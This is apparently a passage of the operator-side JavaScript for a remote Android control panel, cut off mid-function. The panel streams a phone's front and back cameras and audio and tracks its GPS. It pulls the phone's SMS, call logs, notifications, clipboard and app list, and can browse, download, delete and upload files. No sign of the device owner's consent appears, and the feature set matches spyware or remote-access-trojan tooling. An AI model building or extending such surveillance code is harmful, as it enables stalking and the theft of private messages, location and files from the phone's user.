// Command Center Core Client Logic — Native WebSocket Edition

// ─────────────────────────────────────────────────────────────
// Signaling URL resolution
// ─────────────────────────────────────────────────────────────

function getServerURL() {
  const hostname = window.location.hostname;
  if (hostname === 'localhost' || hostname === '127.0.0.1' || hostname.startsWith('192.168.') || hostname.startsWith('10.') || hostname.startsWith('172.')) {
    return 'http://localhost:3000';
  }
  return window.location.origin;
}

function getWebSocketURL() {
  const base = getServerURL();
  if (base.startsWith('https://')) return 'wss://' + base.substring(8);
  if (base.startsWith('http://'))  return 'ws://'  + base.substring(7);
  return base;
}

// ─────────────────────────────────────────────────────────────
// SignalingWebSocket — Drop-in replacement for Socket.IO client
// ─────────────────────────────────────────────────────────────
//
// Mimics the Socket.IO client API on top of the native WebSocket:
//   socket.on(eventName, handler)   — register event listener
//   socket.emit(eventName, payload) — send JSON message { type, ...payload }
//   socket.connect() / socket.disconnect()
//   socket.connected  (property)
//   socket.id         (property, set after server handshake)
//
// Special events that carry a single "id" string:
//   id, web-client-ready, web-client-disconnected,
//   android-client-ready, android-client-disconnected
//
// Lifecycle events are synthesized:
//   'connect'       → fired on WebSocket open
//   'connect_error' → fired on WebSocket error
//   'disconnect'    → fired on WebSocket close
//
// ─────────────────────────────────────────────────────────────

class SignalingWebSocket {
  constructor(url) {
    this.url = url;
    this.ws = null;
    this._id = null;
    this._connected = false;
    this._listeners = new Map();      // eventName -> [handlers]
    this._shouldReconnect = false;
    this._reconnectDelay = 2000;
    this._reconnectMaxDelay = 10000;
    this._reconnectAttempts = 0;
    this._maxReconnectAttempts = 20;
    this._reconnectTimer = null;

    // Events whose payload is a single string id (from the server)
    this._idEvents = new Set([
      'id',
      'web-client-ready',
      'web-client-disconnected',
      'android-client-ready',
      'android-client-disconnected'
    ]);
  }

  // Public: register a listener
  on(eventName, handler) {
    if (!this._listeners.has(eventName)) {
      this._listeners.set(eventName, []);
    }
    this._listeners.get(eventName).push(handler);
    return this;
  }

  // Public: send a message to the server
  emit(eventName, payload) {
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      console.warn(`[WS] Cannot emit "${eventName}" — not connected`);
      return this;
    }

    let message;
    if (eventName === 'identify') {
      // Special case: the server expects { type: "identify", clientType: "web" }
      message = { type: 'identify', clientType: payload || 'web' };
    } else if (payload === undefined || payload === null) {
      message = { type: eventName };
    } else if (typeof payload === 'object') {
      message = Object.assign({ type: eventName }, payload);
    } else {
      message = { type: eventName, data: payload };
    }

    try {
      this.ws.send(JSON.stringify(message));
    } catch (e) {
      console.error(`[WS] Failed to send "${eventName}"`, e);
    }
    return this;
  }

  // Public: getters
  get id() { return this._id; }
  get connected() { return this._connected; }

  // Public: initiate connection
  connect() {
    if (this.ws && (this.ws.readyState === WebSocket.OPEN || this.ws.readyState === WebSocket.CONNECTING)) {
      return this;
    }
    this._shouldReconnect = true;
    this._openSocket();
    return this;
  }

  // Public: close connection
  disconnect() {
    this._shouldReconnect = false;
    if (this._reconnectTimer) {
      clearTimeout(this._reconnectTimer);
      this._reconnectTimer = null;
    }
    if (this.ws) {
      try { this.ws.close(1000, 'Client disconnect'); } catch (e) {}
      this.ws = null;
    }
    this._connected = false;
    this._id = null;
    return this;
  }

  // ── Internal ──────────────────────────────────────────────

  _openSocket() {
    console.log('[WS] Opening connection to', this.url);
    try {
      this.ws = new WebSocket(this.url);
    } catch (e) {
      console.error('[WS] Failed to create WebSocket:', e);
      this._dispatch('connect_error', e);
      this._scheduleReconnect();
      return;
    }

    this.ws.onopen = () => {
      console.log('[WS] Connected');
      this._connected = true;
      this._reconnectAttempts = 0;
      this._dispatch('connect');
      // Send identify handshake for web client
      this.emit('identify', 'web');
    };

    this.ws.onmessage = (event) => {
      let msg;
      try {
        msg = JSON.parse(event.data);
      } catch (e) {
        console.warn('[WS] Invalid JSON:', event.data);
        return;
      }

      const type = msg.type;
      if (!type) {
        console.warn('[WS] Message without type:', msg);
        return;
      }

      // Capture the assigned server ID
      if (type === 'id') {
        this._id = msg.id || null;
        console.log('[WS] Assigned ID:', this._id);
        this._dispatch('id', this._id);
        return;
      }

      // ID-only events — dispatch the id string as first arg
      if (this._idEvents.has(type)) {
        this._dispatch(type, msg.id);
        return;
      }

      // Regular events — dispatch the full message object
      this._dispatch(type, msg);
    };

    this.ws.onerror = (e) => {
      console.warn('[WS] Error:', e);
      this._dispatch('connect_error', e);
    };

    this.ws.onclose = (e) => {
      console.log('[WS] Closed:', e.code, e.reason);
      this._connected = false;
      this._id = null;
      this._dispatch('disconnect', e);
      if (this._shouldReconnect) {
        this._scheduleReconnect();
      }
    };
  }

  _scheduleReconnect() {
    if (this._reconnectTimer) return;
    if (this._reconnectAttempts >= this._maxReconnectAttempts) {
      console.warn('[WS] Max reconnect attempts reached');
      return;
    }
    const delay = Math.min(
      this._reconnectDelay * Math.pow(1.5, this._reconnectAttempts),
      this._reconnectMaxDelay
    );
    this._reconnectAttempts++;
    console.log(`[WS] Reconnecting in ${Math.round(delay)}ms (attempt ${this._reconnectAttempts})`);
    this._reconnectTimer = setTimeout(() => {
      this._reconnectTimer = null;
      if (this._shouldReconnect) this._openSocket();
    }, delay);
  }

  _dispatch(eventName, payload) {
    const handlers = this._listeners.get(eventName);
    if (!handlers || handlers.length === 0) return;
    for (const handler of handlers) {
      try {
        handler(payload);
      } catch (e) {
        console.error(`[WS] Handler for "${eventName}" threw:`, e);
      }
    }
  }
}

// ─────────────────────────────────────────────────────────────
// Socket instance
// ─────────────────────────────────────────────────────────────

const socket = new SignalingWebSocket(getWebSocketURL());
socket.connect();

// ─────────────────────────────────────────────────────────────
// Video Sinks
// ─────────────────────────────────────────────────────────────
const videoFront = document.getElementById('remoteVideoFront');
const videoBack = document.getElementById('remoteVideoBack');
const tagFront = document.getElementById('tagFront');
const tagBack = document.getElementById('tagBack');

// Elements
const statusDiv = document.getElementById('status');
const retryButton = document.getElementById('retryButton');
const debugLog = document.getElementById('debugLog');

// Device Metrics Elements
const infoModel = document.getElementById('infoModel');
const infoManufacturer = document.getElementById('infoManufacturer');
const infoVersion = document.getElementById('infoVersion');
const infoBattery = document.getElementById('infoBattery');

// Hardware Controls
const volumeSlider = document.getElementById('volumeSlider');
const volumeVal = document.getElementById('volumeVal');
const brightnessSlider = document.getElementById('brightnessSlider');
const brightnessVal = document.getElementById('brightnessVal');
const flashlightToggle = document.getElementById('flashlightToggle');

// Quick Action Buttons
const btnVibrate = document.getElementById('btnVibrate');
const btnRing = document.getElementById('btnRing');
const btnToast = document.getElementById('btnToast');
const btnOpenUrl = document.getElementById('btnOpenUrl');
const btnSwitchCamera = document.getElementById('btnSwitchCamera');
const btnRecord = document.getElementById('btnRecord');

// Telemetry Tabs
const tabNotifications = document.getElementById('tabNotifications');
const tabCalls = document.getElementById('tabCalls');
const tabSms = document.getElementById('tabSms');
const tabApps = document.getElementById('tabApps');

const paneNotifications = document.getElementById('paneNotifications');
const paneCalls = document.getElementById('paneCalls');
const paneSms = document.getElementById('paneSms');
const paneApps = document.getElementById('paneApps');

const notificationsList = document.getElementById('notificationList');
const callLogList = document.getElementById('callLogList');
const smsList = document.getElementById('smsList');
const appList = document.getElementById('appList');

// Dynamic Elements
const infoBatteryDetails = document.getElementById('infoBatteryDetails');
const storageText = document.getElementById('storageText');
const storageProgress = document.getElementById('storageProgress');
const videoQualitySelect = document.getElementById('videoQualitySelect');
const gpsIntervalSelect = document.getElementById('gpsIntervalSelect');
const btnRefreshLocation = document.getElementById('btnRefreshLocation');
const appSearchInput = document.getElementById('appSearchInput');
const btnRefreshApps = document.getElementById('btnRefreshApps');

// File Explorer Elements
const fsPathInput = document.getElementById('fsPathInput');
const fsBackBtn = document.getElementById('fsBackBtn');
const fsGoBtn = document.getElementById('fsGoBtn');
const fileListDiv = document.getElementById('fileList');

// Custom Modal Elements
const dialogOverlay = document.getElementById('dialogOverlay');
const dialogTitle = document.getElementById('dialogTitle');
const dialogDesc = document.getElementById('dialogDesc');
const dialogInput = document.getElementById('dialogInput');
const dialogBtnCancel = document.getElementById('dialogBtnCancel');
const dialogBtnConfirm = document.getElementById('dialogBtnConfirm');

// Ambient Sensors DOM
const sensorsToggle = document.getElementById('sensorsToggle');
const sensorLux = document.getElementById('sensorLux');
const sensorProximity = document.getElementById('sensorProximity');
const sensorAccel = document.getElementById('sensorAccel');

// Network Analyzer DOM
const btnRefreshNetwork = document.getElementById('btnRefreshNetwork');
const netSsid = document.getElementById('netSsid');
const netSpeed = document.getElementById('netSpeed');
const netIp = document.getElementById('netIp');
const netRssi = document.getElementById('netRssi');

// Clipboard DOM
const clipboardTextArea = document.getElementById('clipboardTextArea');
const btnFetchClipboard = document.getElementById('btnFetchClipboard');
const btnSetClipboard = document.getElementById('btnSetClipboard');

// Snapshot DOM
const btnSnapFront = document.getElementById('btnSnapFront');
const btnSnapBack = document.getElementById('btnSnapBack');
const snapshotModal = document.getElementById('snapshotModal');
const snapshotPreview = document.getElementById('snapshotPreview');
const btnDownloadSnapshot = document.getElementById('btnDownloadSnapshot');
const btnCloseSnapshot = document.getElementById('btnCloseSnapshot');

// Voice Broadcast DOM
const ttsText = document.getElementById('ttsText');
const ttsPitch = document.getElementById('ttsPitch');
const ttsPitchVal = document.getElementById('ttsPitchVal');
const ttsSpeed = document.getElementById('ttsSpeed');
const ttsSpeedVal = document.getElementById('ttsSpeedVal');
const btnTtsSpeak = document.getElementById('btnTtsSpeak');

// Talkback Intercom DOM
const talkbackToggle = document.getElementById('talkbackToggle');

// File Upload DOM
const fsUploadArea = document.getElementById('fsUploadArea');
const fsUploadInput = document.getElementById('fsUploadInput');
const fsUploadLabel = document.getElementById('fsUploadLabel');
const fsUploadProgress = document.getElementById('fsUploadProgress');

// RTCPeerConnection State
let peer;
let myId;
let androidClientId;
let map;
let marker;
let audioTrack = null;
let frontVideoTrack = null;
let backVideoTrack = null;
let localMicStream = null;
let localMicSender = null;

// Chunked Download State
let activeDownloads = {};
let isTalkbackActive = false;

// Graphing Buffer State
const sensorHistory = [];
const maxHistoryPoints = 60;
let canvasCtx = null;

const rtcConfig = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
  ]
};

// Modal Dispatch Helper
let currentModalAction = null;

// ─────────────────────────────────────────────────────────────
// Diagnostics Logs & Connections Status
// ─────────────────────────────────────────────────────────────

function updateStatus(message) {
  console.log(message);
  statusDiv.textContent = message;
  logDebug(message);
  retryButton.style.display = message.includes('Failed') || message.includes('disconnected') ? 'block' : 'none';
}

function logDebug(message) {
  const logEntry = document.createElement('div');
  logEntry.className = 'terminal-entry';
  logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
  debugLog.prepend(logEntry);
  while (debugLog.children.length > 60) {
    debugLog.removeChild(debugLog.lastChild);
  }
}

function reconnectSocket() {
  updateStatus('Reconnecting to server...');
  socket.connect();
}

// ─────────────────────────────────────────────────────────────
// Telemetry Tab Navigation
// ─────────────────────────────────────────────────────────────

function switchTab(activeTab, activePane) {
  [tabNotifications, tabCalls, tabSms, tabApps].forEach(t => t.classList.remove('active'));
  [paneNotifications, paneCalls, paneSms, paneApps].forEach(p => p.style.display = 'none');

  activeTab.classList.add('active');
  activePane.style.display = activePane === paneApps ? 'flex' : 'block';
}

tabNotifications.addEventListener('click', () => switchTab(tabNotifications, paneNotifications));
tabCalls.addEventListener('click', () => switchTab(tabCalls, paneCalls));
tabSms.addEventListener('click', () => switchTab(tabSms, paneSms));
tabApps.addEventListener('click', () => {
  switchTab(tabApps, paneApps);
  if (androidClientId && appList.children.length <= 1) {
    socket.emit('cmd:get_apps', { to: androidClientId });
  }
});

btnRefreshApps.addEventListener('click', () => {
  if (!androidClientId) return;
  logDebug('[CMD] Syncing installed applications');
  socket.emit('cmd:get_apps', { to: androidClientId });
});

appSearchInput.addEventListener('input', (e) => {
  const query = e.target.value.toLowerCase();
  const appItems = appList.querySelectorAll('.data-item');
  appItems.forEach(item => {
    const text = item.textContent.toLowerCase();
    item.style.display = text.includes(query) ? 'flex' : 'none';
  });
});

// ─────────────────────────────────────────────────────────────
// Telemetry Renderers
// ─────────────────────────────────────────────────────────────

function addNotification(notification) {
  const item = document.createElement('div');
  item.className = 'data-item';
  item.innerHTML = `
    <div class="data-icon">🔔</div>
    <div class="data-details">
      <div class="data-title">${escapeHtml(notification.title || 'Notification')} (${escapeHtml(notification.appName)})</div>
      <div class="data-desc">${escapeHtml(notification.text || '')}</div>
    </div>
    <div class="data-time">${escapeHtml(notification.timestamp || '')}</div>
  `;
  notificationsList.prepend(item);
  while (notificationsList.children.length > 25) {
    notificationsList.removeChild(notificationsList.lastChild);
  }
}

function addCallLog(call) {
  const item = document.createElement('div');
  item.className = 'data-item';
  item.innerHTML = `
    <div class="data-icon">📞</div>
    <div class="data-details">
      <div class="data-title">${escapeHtml(call.number)} (${escapeHtml(call.type)})</div>
      <div class="data-desc">Duration: ${call.duration}s</div>
    </div>
    <div class="data-time">${escapeHtml(call.date)}</div>
  `;
  callLogList.prepend(item);
  while (callLogList.children.length > 25) {
    callLogList.removeChild(callLogList.lastChild);
  }
}

function addSmsMessage(sms) {
  const item = document.createElement('div');
  item.className = 'data-item';
  item.innerHTML = `
    <div class="data-icon">💬</div>
    <div class="data-details">
      <div class="data-title">${escapeHtml(sms.address)} (${escapeHtml(sms.type)})</div>
      <div class="data-desc">${escapeHtml(sms.body)}</div>
    </div>
    <div class="data-time">${escapeHtml(sms.date)}</div>
  `;
  smsList.prepend(item);
  while (smsList.children.length > 50) {
    smsList.removeChild(smsList.lastChild);
  }
}

function escapeHtml(str) {
  if (!str) return '';
  return str.toString()
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// ─────────────────────────────────────────────────────────────
// Maps Integration
// ─────────────────────────────────────────────────────────────

function initMap() {
  try {
    map = L.map('mapContainer', { zoomControl: false }).setView([0, 0], 2);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      attribution: '© OpenStreetMap contributors, © CARTO'
    }).addTo(map);
    L.control.zoom({ position: 'bottomright' }).addTo(map);
    logDebug('Dark Maps initialized');
  } catch (e) {
    console.error('Map init failed:', e);
  }
}

function initSensorChart() {
  const canvas = document.getElementById('sensorChart');
  if (canvas) {
    canvasCtx = canvas.getContext('2d');
  }
}

function drawSensorChart() {
  if (!canvasCtx) return;
  const canvas = canvasCtx.canvas;
  const w = canvas.width;
  const h = canvas.height;

  canvasCtx.fillStyle = '#0a0d14';
  canvasCtx.fillRect(0, 0, w, h);

  if (sensorHistory.length === 0) return;

  const step = w / maxHistoryPoints;

  canvasCtx.strokeStyle = 'rgba(255, 255, 255, 0.03)';
  canvasCtx.lineWidth = 1;
  for (let i = 0; i < maxHistoryPoints; i += 10) {
    const x = i * step;
    canvasCtx.beginPath();
    canvasCtx.moveTo(x, 0);
    canvasCtx.lineTo(x, h);
    canvasCtx.stroke();
  }

  const drawLine = (valExtractor, color) => {
    canvasCtx.strokeStyle = color;
    canvasCtx.lineWidth = 1.5;
    canvasCtx.beginPath();
    sensorHistory.forEach((pt, idx) => {
      const val = valExtractor(pt);
      const y = h/2 - (val / 15) * (h/2);
      const x = idx * step;
      if (idx === 0) canvasCtx.moveTo(x, y);
      else canvasCtx.lineTo(x, y);
    });
    canvasCtx.stroke();
  };

  canvasCtx.strokeStyle = '#10b981';
  canvasCtx.lineWidth = 1.5;
  canvasCtx.beginPath();
  sensorHistory.forEach((pt, idx) => {
    const lux = pt.lux || 0;
    const normLux = Math.min(1, Math.log10(lux + 1) / 4);
    const y = h - normLux * (h - 10) - 5;
    const x = idx * step;
    if (idx === 0) canvasCtx.moveTo(x, y);
    else canvasCtx.lineTo(x, y);
  });
  canvasCtx.stroke();

  drawLine(pt => pt.accelX || 0, '#ef4444');
  drawLine(pt => pt.accelY || 0, '#f59e0b');
  drawLine(pt => pt.accelZ || 0, '#3b82f6');
}

function updateMap(latitude, longitude) {
  if (!map) initMap();
  try {
    if (marker) {
      marker.setLatLng([latitude, longitude]);
    } else {
      marker = L.marker([latitude, longitude]).addTo(map);
      marker.bindPopup('Active Device').openPopup();
    }
    map.setView([latitude, longitude], 15);
    logDebug(`Map target coordinates: lat=${latitude.toFixed(5)}, lng=${longitude.toFixed(5)}`);
  } catch (e) {
    console.error('Map update failed:', e);
  }
}

// ─────────────────────────────────────────────────────────────
// WebRTC Stream Management
// ─────────────────────────────────────────────────────────────

function updateStreams() {
  if (frontVideoTrack) {
    const frontStream = new MediaStream([frontVideoTrack]);
    if (audioTrack) frontStream.addTrack(audioTrack);
    videoFront.srcObject = frontStream;
    tagFront.textContent = 'FRONT LIVE';
    tagFront.style.background = 'rgba(16, 185, 129, 0.2)';
    tagFront.style.color = 'var(--success)';
    tagFront.style.borderColor = 'var(--success)';
    videoFront.play().catch(e => console.log('Autoplay front blocked'));
  }
  if (backVideoTrack) {
    const backStream = new MediaStream([backVideoTrack]);
    if (audioTrack) backStream.addTrack(audioTrack);
    videoBack.srcObject = backStream;
    tagBack.textContent = 'BACK LIVE';
    tagBack.style.background = 'rgba(16, 185, 129, 0.2)';
    tagBack.style.color = 'var(--success)';
    tagBack.style.borderColor = 'var(--success)';
    videoBack.play().catch(e => console.log('Autoplay back blocked'));
  }
}

// ─────────────────────────────────────────────────────────────
// Hardware Controls Emitters
// ─────────────────────────────────────────────────────────────

volumeSlider.addEventListener('input', (e) => {
  volumeVal.textContent = `${e.target.value}%`;
});

volumeSlider.addEventListener('change', (e) => {
  if (!androidClientId) return;
  const val = parseInt(e.target.value);
  logDebug(`[CMD] Set stream volume: ${val}%`);
  socket.emit('cmd:set_volume', { to: androidClientId, stream: 'music', pct: val });
});

brightnessSlider.addEventListener('input', (e) => {
  brightnessVal.textContent = `${e.target.value}%`;
});

brightnessSlider.addEventListener('change', (e) => {
  if (!androidClientId) return;
  const val = parseInt(e.target.value);
  logDebug(`[CMD] Set screen brightness: ${val}%`);
  socket.emit('cmd:set_brightness', { to: androidClientId, pct: val });
});

flashlightToggle.addEventListener('change', (e) => {
  if (!androidClientId) return;
  const isChecked = e.target.checked;
  logDebug(`[CMD] Flashlight: ${isChecked ? 'ON' : 'OFF'}`);
  socket.emit('cmd:flashlight', { to: androidClientId, on: isChecked });
});

ttsPitch.addEventListener('input', (e) => {
  ttsPitchVal.textContent = parseFloat(e.target.value).toFixed(1);
});

ttsSpeed.addEventListener('input', (e) => {
  ttsSpeedVal.textContent = parseFloat(e.target.value).toFixed(1);
});

btnTtsSpeak.addEventListener('click', () => {
  if (!androidClientId) return;
  const text = ttsText.value.trim();
  const pitch = parseFloat(ttsPitch.value);
  const speed = parseFloat(ttsSpeed.value);
  if (!text) return;
  logDebug(`[CMD] TTS Speak: "${text}" (pitch=${pitch}, speed=${speed})`);
  socket.emit('cmd:tts_speak', { to: androidClientId, text: text, pitch: pitch, speed: speed });
});

talkbackToggle.addEventListener('click', async () => {
  if (!androidClientId || !peer) return;

  if (isTalkbackActive) {
    isTalkbackActive = false;
    talkbackToggle.textContent = '🎙️ Talkback OFF';
    talkbackToggle.style.color = 'var(--text-muted)';
    talkbackToggle.style.borderColor = 'rgba(255,255,255,0.05)';
    talkbackToggle.style.background = 'transparent';

    if (localMicSender) {
      peer.removeTrack(localMicSender);
      localMicSender = null;
    }
    if (localMicStream) {
      localMicStream.getTracks().forEach(track => track.stop());
      localMicStream = null;
    }
    logDebug('[TALKBACK] Microphone transmission suspended');
  } else {
    try {
      localMicStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const track = localMicStream.getAudioTracks()[0];
      localMicSender = peer.addTrack(track, localMicStream);

      const offer = await peer.createOffer();
      await peer.setLocalDescription(offer);
      socket.emit('signal', {
        to: androidClientId,
        from: myId,
        signal: { type: 'offer', sdp: offer.sdp }
      });

      isTalkbackActive = true;
      talkbackToggle.textContent = '🎙️ Talkback ACTIVE';
      talkbackToggle.style.color = '#10b981';
      talkbackToggle.style.borderColor = '#10b981';
      talkbackToggle.style.background = 'rgba(16, 185, 129, 0.1)';
      logDebug('[TALKBACK] Microphone transmission active (broadcasting to device speaker)');
    } catch (err) {
      logDebug('[TALKBACK] Microphone capture blocked: ' + err.message);
    }
  }
});

videoQualitySelect.addEventListener('change', (e) => {
  if (!androidClientId) return;
  const quality = e.target.value;
  logDebug(`[CMD] Changing video quality: ${quality}`);
  socket.emit('cmd:set_quality', { to: androidClientId, quality: quality });
});

gpsIntervalSelect.addEventListener('change', (e) => {
  if (!androidClientId) return;
  const val = parseInt(e.target.value);
  logDebug(`[CMD] GPS Polling interval: ${val}ms`);
  socket.emit('cmd:set_gps_interval', { to: androidClientId, intervalMs: val });
});

btnRefreshLocation.addEventListener('click', () => {
  if (!androidClientId) return;
  logDebug('[CMD] Refreshing location telemetry');
  socket.emit('cmd:ping', { to: androidClientId });
});

// ─────────────────────────────────────────────────────────────
// Action Buttons Emitters
// ─────────────────────────────────────────────────────────────

btnVibrate.addEventListener('click', () => {
  if (!androidClientId) return;
  logDebug('[CMD] Triggering vibration haptic pulse');
  socket.emit('cmd:vibrate', { to: androidClientId, duration: 800 });
});

btnRing.addEventListener('click', () => {
  if (!androidClientId) return;
  logDebug('[CMD] Ringing default system siren');
  socket.emit('cmd:ring', { to: androidClientId });
});

btnSwitchCamera.addEventListener('click', () => {
  if (!androidClientId) return;
  logDebug('[CMD] Switching WebRTC video source tracks');
  socket.emit('cmd:camera_switch', { to: androidClientId });
});

sensorsToggle.addEventListener('change', (e) => {
  if (!androidClientId) return;
  const isChecked = e.target.checked;
  logDebug(`[CMD] Toggle ambient sensors stream: ${isChecked ? 'SUBSCRIBE' : 'UNSUBSCRIBE'}`);
  socket.emit('cmd:toggle_sensors', { to: androidClientId, active: isChecked });
});

btnRefreshNetwork.addEventListener('click', () => {
  if (!androidClientId) return;
  logDebug('[CMD] Running connection speed diagnostics');
  socket.emit('cmd:get_network', { to: androidClientId });
});

btnRecord.addEventListener('click', () => {
  if (!androidClientId) return;
  const isRecording = btnRecord.classList.contains('active');
  logDebug(`[CMD] Requesting recording: ${isRecording ? 'STOP' : 'START'}`);
  socket.emit('cmd:record', { to: androidClientId });
});

btnFetchClipboard.addEventListener('click', () => {
  if (!androidClientId) return;
  logDebug('[CMD] Fetching primary clipboard context');
  socket.emit('cmd:get_clipboard', { to: androidClientId });
});

btnSetClipboard.addEventListener('click', () => {
  if (!androidClientId) return;
  const text = clipboardTextArea.value;
  logDebug('[CMD] Updating device clipboard context');
  socket.emit('cmd:set_clipboard', { to: androidClientId, text: text });
});

btnSnapFront.addEventListener('click', () => {
  if (!androidClientId) return;
  logDebug('[CMD] Capturing snapshot frame: Front lens');
  socket.emit('cmd:take_snapshot', { to: androidClientId, useFront: true });
});

btnSnapBack.addEventListener('click', () => {
  if (!androidClientId) return;
  logDebug('[CMD] Capturing snapshot frame: Back lens');
  socket.emit('cmd:take_snapshot', { to: androidClientId, useFront: false });
});

let currentSnapshotBase64 = null;

btnCloseSnapshot.addEventListener('click', () => {
  snapshotModal.classList.remove('active');
  snapshotPreview.src = '';
  currentSnapshotBase64 = null;
});

btnDownloadSnapshot.addEventListener('click', () => {
  if (currentSnapshotBase64) {
    downloadBase64File(currentSnapshotBase64, `snapshot_${Date.now()}.jpg`);
  }
});

btnToast.addEventListener('click', () => {
  openModal('Push Notification Alert', 'Enter the message string to display on the Android device.', 'Hello Command Center!', (text) => {
    if (!androidClientId) return;
    logDebug(`[CMD] Dispatch toast alert: "${text}"`);
    socket.emit('cmd:toast', { to: androidClientId, text: text });
  });
});

btnOpenUrl.addEventListener('click', () => {
  openModal('Launch Target URL', 'Enter the full web URL to open in the system browser.', 'https://google.com', (url) => {
    if (!androidClientId) return;
    logDebug(`[CMD] Launch URL browser intent: ${url}`);
    socket.emit('cmd:open_url', { to: androidClientId, url: url });
  });
});

function openModal(title, description, defaultValue, callback) {
  dialogTitle.textContent = title;
  dialogDesc.textContent = description;
  dialogInput.value = defaultValue;
  dialogOverlay.classList.add('active');
  currentModalAction = callback;
}

function closeModal() {
  dialogOverlay.classList.remove('active');
  currentModalAction = null;
}

dialogBtnCancel.addEventListener('click', closeModal);
dialogBtnConfirm.addEventListener('click', () => {
  if (currentModalAction) {
    currentModalAction(dialogInput.value);
  }
  closeModal();
});

// ─────────────────────────────────────────────────────────────
// File Explorer logic
// ─────────────────────────────────────────────────────────────

let currentPath = "/storage/emulated/0/";

function requestFileList(path) {
  if (!androidClientId) {
    updateStatus('No Android client connected');
    return;
  }
  updateStatus(`Requesting files: ${path}`);
  socket.emit('fs:list', { to: androidClientId, path: path });
}

function renderFileList(files, path) {
  if (path) {
    currentPath = path;
    fsPathInput.value = path;
  }
  fileListDiv.innerHTML = '';

  if (!files || files.length === 0) {
    fileListDiv.innerHTML = '<div style="color: var(--text-muted); padding: 14px; font-size: 0.85rem;">This directory is empty.</div>';
    return;
  }

  files.sort((a, b) => {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    return a.name.localeCompare(b.name);
  });

  files.forEach(file => {
    const item = document.createElement('div');
    item.className = 'file-item';

    const icon = document.createElement('span');
    icon.className = 'file-icon';
    icon.textContent = file.isDir ? '📁' : '📄';

    const info = document.createElement('div');
    info.className = 'file-info';

    const name = document.createElement('div');
    name.className = 'file-name';
    name.textContent = file.name;
    if (file.isDir) name.style.color = 'var(--primary)';

    const size = document.createElement('div');
    size.className = 'file-size';
    size.textContent = file.isDir ? 'Folder' : formatBytes(file.size);

    info.appendChild(name);
    info.appendChild(size);

    const actions = document.createElement('div');
    actions.className = 'file-actions';

    if (!file.isDir) {
      const downloadBtn = document.createElement('button');
      downloadBtn.className = 'btn-file-action download';
      downloadBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>`;
      downloadBtn.onclick = (e) => {
        e.stopPropagation();
        requestFileDownload(file.path);
      };
      actions.appendChild(downloadBtn);
    }

    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'btn-file-action delete';
    deleteBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>`;
    deleteBtn.onclick = (e) => {
      e.stopPropagation();
      if (confirm(`Permanently delete ${file.name}?`)) {
        deleteFile(file.path);
      }
    };
    actions.appendChild(deleteBtn);

    item.appendChild(icon);
    item.appendChild(info);
    item.appendChild(actions);

    if (file.isDir) {
      item.onclick = () => requestFileList(file.path);
    }

    fileListDiv.appendChild(item);
  });
}

function formatBytes(bytes) {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function requestFileDownload(path) {
  updateStatus(`Starting download: ${path}`);
  if (androidClientId) {
    socket.emit('fs:download', { to: androidClientId, path: path });
  }
}

function deleteFile(path) {
  updateStatus(`Requesting deletion: ${path}`);
  if (androidClientId) {
    socket.emit('fs:delete', { to: androidClientId, path: path });
  }
}

fsGoBtn.addEventListener('click', () => {
  requestFileList(fsPathInput.value);
});

fsBackBtn.addEventListener('click', () => {
  let path = currentPath;
  if (path.endsWith('/')) path = path.slice(0, -1);
  if (path === '') path = '/';

  const lastSlash = path.lastIndexOf('/');
  if (lastSlash !== -1) {
    const parent = path.substring(0, lastSlash + 1) || '/';
    requestFileList(parent);
  } else {
    requestFileList('/');
  }
});

fsUploadArea.addEventListener('click', () => {
  fsUploadInput.click();
});

fsUploadInput.addEventListener('change', (e) => {
  if (e.target.files.length > 0) {
    uploadTargetFile(e.target.files[0]);
  }
});

fsUploadArea.addEventListener('dragover', (e) => {
  e.preventDefault();
  fsUploadArea.style.borderColor = 'var(--primary)';
  fsUploadArea.style.background = 'rgba(0, 240, 255, 0.04)';
});

['dragleave', 'dragend', 'drop'].forEach(evt => {
  fsUploadArea.addEventListener(evt, () => {
    fsUploadArea.style.borderColor = 'rgba(255,255,255,0.08)';
    fsUploadArea.style.background = 'rgba(0,0,0,0.15)';
  });
});

fsUploadArea.addEventListener('drop', (e) => {
  e.preventDefault();
  if (e.dataTransfer.files.length > 0) {
    uploadTargetFile(e.dataTransfer.files[0]);
  }
});

function uploadTargetFile(file) {
  if (!androidClientId) {
    logDebug('Cannot upload file, no device paired');
    return;
  }

  logDebug(`[FS] Initiating chunked uploader: ${file.name} (${formatBytes(file.size)})`);
  fsUploadLabel.textContent = `Uploading ${file.name}... (0%)`;
  fsUploadProgress.style.width = '0%';

  const reader = new FileReader();
  reader.onload = async (event) => {
    const rawBuffer = event.target.result;
    const chunkSize = 64 * 1024;
    const totalChunks = Math.ceil(rawBuffer.byteLength / chunkSize);

    socket.emit('fs:upload_start', {
      to: androidClientId,
      filename: file.name,
      parentPath: currentPath,
      totalChunks: totalChunks
    });

    for (let idx = 0; idx < totalChunks; idx++) {
      const start = idx * chunkSize;
      const end = Math.min(start + chunkSize, rawBuffer.byteLength);
      const slice = rawBuffer.slice(start, end);

